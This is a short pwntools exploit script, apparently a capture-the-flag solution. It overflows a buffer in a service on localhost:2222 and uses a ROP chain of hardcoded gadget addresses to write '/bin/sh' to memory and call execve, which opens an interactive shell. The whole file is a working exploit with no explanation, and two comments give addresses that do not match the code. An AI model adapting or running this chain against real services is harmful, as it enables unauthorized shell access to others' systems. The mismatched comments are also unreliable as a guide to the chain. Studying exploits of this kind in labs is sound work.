from pwn import *

target = connect('localhost',2222)
# pop ROP gadgets
pop_rax = p64(0x41fd64)
pop_rdi = p64(0x4016b6)
pop_rsi = p64(0x4017d7)
pop_rdx = p64(0x4431f6)
#writeGadget
writeGadget = p64(0x47ba98)
#syscall
syscall = p64(0x4003da)
# Overwrite return address
payload = "a"*280
#0x000000000047ba68 : mov qword ptr [rax], rdx ; pop rbx ; ret
payload += pop_rdx
payload += p64(0x0068732f6e69622f)
payload += pop_rax
payload += p64(0x006ca000)
payload += writeGadget
payload += p64(0)
# Setup args for syscall
# pop rax, 0x3b
payload += pop_rax
payload += p64(0x3b)
# pop rdi, 0x6b6000
payload += pop_rdi
payload += p64(0x006ca000)
# pop rsi, 0x0
# pop rdx, 0x0
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
# syscall
payload += syscall
target.sendlineafter("?",payload)
target.interactive()

